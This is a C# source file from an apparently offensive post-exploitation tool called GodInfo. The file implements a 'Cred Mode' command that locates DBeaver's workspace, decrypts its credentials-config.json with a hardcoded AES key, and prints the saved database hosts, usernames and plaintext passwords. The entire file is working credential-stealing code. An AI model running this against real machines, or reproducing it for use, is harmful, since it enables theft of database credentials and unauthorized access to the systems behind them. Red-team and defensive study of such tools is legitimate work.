using GodInfo.Utils;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;

namespace GodInfo.Commands
{
    public class DBeaverCredCommand : ICommand
    {
        public struct ConnectionInfo
        {
            public string Host;
            public string Username;
            public string Password;
        }

        private const string DefaultWorkspace = "workspace6";
        private static readonly string[] PossibleWorkspaces = { "workspace6", "workspace", "workspace7", "workspace8" };
        private const string DBeaverProcessName = "dbeaver.exe";
        private const string DBeaver64ProcessName = "dbeaver64.exe";

        public void Execute(List<string> args)
        {
            Logger.TaskHeader("Cred Mode", 1);
            Logger.WriteLine("[*] Hunting passwords saved by DBeaver.");
            
            if (args.Count == 1)
            {
                string configPath = args[0].ToString();
                GetDBeaverCred(configPath);
            }
            else
            {
                GetDBeaverCred();
            }
        }

        public static void GetDBeaverCred(string customPath = null)
        {
            Logger.TaskHeader("Hunting DBeaver", 1);

            string dbeaverDataPath = FindDBeaverDataPath();
            if (string.IsNullOrEmpty(dbeaverDataPath))
            {
                Logger.WriteLine("[-] DBeaver configuration directory not found.");
                return;
            }

            Logger.WriteLine($"[+] DBeaver Data Path: {dbeaverDataPath}");

            string workspacePath = FindWorkspacePath(dbeaverDataPath);
            if (string.IsNullOrEmpty(workspacePath))
            {
                Logger.WriteLine("[-] DBeaver workspace directory not found.");
                return;
            }

            Logger.WriteLine($"[+] DBeaver Workspace Path: {workspacePath}");

            string sourcesPath = Path.Combine(workspacePath, "General\\.dbeaver\\data-sources.json");
            string credentialsPath = Path.Combine(workspacePath, "General\\.dbeaver\\credentials-config.json");

            if (!File.Exists(sourcesPath))
            {
                Logger.WriteLine($"[-] Data sources file not found: {sourcesPath}");
                return;
            }

            if (!File.Exists(credentialsPath))
            {
                Logger.WriteLine($"[-] Credentials file not found: {credentialsPath}");
                return;
            }

            try
            {
                string decryptedConfig = Decrypt(credentialsPath, "babb4a9f774ab853c96c2d653dfe544a", "00000000000000000000000000000000");
                string sourcesContent = File.ReadAllText(sourcesPath);
                
                List<ConnectionInfo> connections = ExtractConnectionInfo(decryptedConfig, sourcesContent);
                
                if (connections.Count > 0)
                {
                    Logger.WriteLine($"[+] Found {connections.Count} database connections:");
                    Logger.PrintTableFromStructs(connections);
                }
                else
                {
                    Logger.WriteLine("[-] No database connections found.");
                }
            }
            catch (Exception ex)
            {
                Logger.WriteLine($"[-] Error processing DBeaver credentials: {ex.Message}");
            }
        }

        private static List<ConnectionInfo> ExtractConnectionInfo(string config, string sources)
        {
            List<ConnectionInfo> connections = new List<ConnectionInfo>();
            
            string pattern = @"\""(?<key>[^""]+)\""\s*:\s*\{\s*\""#connection\""\s*:\s*\{\s*\""user\""\s*:\s*\""(?<user>[^""]+)\""\s*,\s*\""password\""\s*:\s*\""(?<password>[^""]+)\""\s*\}\s*\}";
            MatchCollection matches = Regex.Matches(config, pattern);
            
            foreach (Match match in matches)
            {
                string key = match.Groups["key"].Value;
                string user = match.Groups["user"].Value;
                string password = match.Groups["password"].Value;
                string host = MatchDataSource(sources, key);
                
                connections.Add(new ConnectionInfo
                {
                    Host = host,
                    Username = user,
                    Password = password
                });
            }
            
            return connections;
        }

        private static string MatchDataSource(string json, string jdbcKey)
        {
            string pattern = $"\"({Regex.Escape(jdbcKey)})\":\\s*{{[^}}]+?\"url\":\\s*\"([^\"]+)\"[^}}]+?}}";
            Match match = Regex.Match(json, pattern);
            if (match.Success)
            {
                string url = match.Groups[2].Value;
                return url;
            }
            return "Unknown";
        }

        public static string FindDBeaverDataPath()
        {
            string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string dbeaverDataPath = Path.Combine(appDataPath, "DBeaverData");
            
            if (Directory.Exists(dbeaverDataPath))
            {
                return dbeaverDataPath;
            }
            
            // 尝试从进程找到路径
            var processInfo = CommonUtils.GetProcessInfoByName(DBeaverProcessName);
            if (!processInfo.HasValue)
            {
                processInfo = CommonUtils.GetProcessInfoByName(DBeaver64ProcessName);
            }
            
            if (processInfo.HasValue)
            {
                string exePath = processInfo.Value.FilePath;
                string exeDir = Path.GetDirectoryName(exePath);
                
                // 检查可能的配置目录
                string possibleDataPath = Path.Combine(exeDir, "configuration", ".data");
                if (Directory.Exists(possibleDataPath))
                {
                    return possibleDataPath;
                }
            }
            
            return null;
        }

        private static string FindWorkspacePath(string dbeaverDataPath)
        {
            foreach (string workspace in PossibleWorkspaces)
            {
                string path = Path.Combine(dbeaverDataPath, workspace);
                if (Directory.Exists(path))
                {
                    return path;
                }
            }
            return null;
        }

        private static string Decrypt(string filePath, string keyHex, string ivHex)
        {
            byte[] encryptedBytes = File.ReadAllBytes(filePath);
            byte[] key = StringToByteArray(keyHex);
            byte[] iv = StringToByteArray(ivHex);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using (MemoryStream memoryStream = new MemoryStream(encryptedBytes))
                {
                    using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read))
                    {
                        using (StreamReader streamReader = new StreamReader(cryptoStream, Encoding.UTF8))
                        {
                            return streamReader.ReadToEnd();
                        }
                    }
                }
            }
        }

        private static byte[] StringToByteArray(string hex)
        {
            int numberChars = hex.Length;
            byte[] bytes = new byte[numberChars / 2];
            for (int i = 0; i < numberChars; i += 2)
            {
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            }
            return bytes;
        }

        public static bool CheckDBeaverConfigExists()
        {
            string dbeaverDataPath = FindDBeaverDataPath();
            if (string.IsNullOrEmpty(dbeaverDataPath))
            {
                return false;
            }

            string workspacePath = FindWorkspacePath(dbeaverDataPath);
            if (string.IsNullOrEmpty(workspacePath))
            {
                return false;
            }

            string sourcesPath = Path.Combine(workspacePath, "General\\.dbeaver\\data-sources.json");
            string credentialsPath = Path.Combine(workspacePath, "General\\.dbeaver\\credentials-config.json");

            return File.Exists(sourcesPath) && File.Exists(credentialsPath);
        }
    }
} 